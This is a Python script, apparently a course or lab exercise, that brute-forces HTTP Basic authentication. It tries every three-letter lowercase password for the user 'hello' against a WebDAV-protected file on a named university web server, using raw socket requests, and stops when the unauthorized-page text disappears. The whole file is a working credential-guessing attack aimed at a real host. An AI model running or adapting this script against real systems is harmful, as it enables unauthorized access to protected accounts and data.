import socket
import base64
#list of possible password
f = open('passlist.txt','r')
target_port = 80 
target_host = "pauline.informatik.tu-chemnitz.de" 
# target_host = "api.google.com"
i = 0 
res_len = 1419
# alphabet list for making brute force attack
alphabets = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

import itertools
# generat 3 letter pass
keywo = [''.join(i) for i in itertools.product(alphabets, repeat = 3)]
for authkey in keywo:
    # print(authkey.strip()
    print(authkey)
    # authkey64 = base64.b64encode(("hello:"+authkey.strip()).encode('utf-8'))
    authkey64 = base64.b64encode(("hello:"+authkey).encode('utf-8'))
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    i +=1
    # connect the client 
    # print(authkey64)
    host_name = socket.gethostbyname(target_host)
    # print(host_name)
    client.connect((host_name,target_port))  
    
    print(authkey64)
    # send some data 
    request = 'GET /webdav_http_basic/secret.jpg HTTP/1.1\r\nHost: pauline.informatik.tu-chemnitz.de \r\nAuthorization: Basic %s\r\n\r\n'%(authkey64.decode("utf-8"))
    try:
        # print(request)
        client.send(request.encode()) 
        # print(client)
        # print('========')
        response = client.recv(10000000)
        http_response = repr(response)
        http_response_len = len(http_response)
        # print(http_response+"\n"+authkey if res_len != http_response_len else "NO PASS")
        client.close()
        chr = str(http_response)
        if i%1000==0 or i>1200:
            print(i)
        # print(http_response if http_response_len != res_len else "Pass")
        if "You are not authorized to view this page" not in chr:
            print("=======AUTH KEY FOUND ======")
            print(http_response_len)
            print(authkey)
            print('========')
            print(http_response)
            break
    except Exception as ex:
        print(ex)
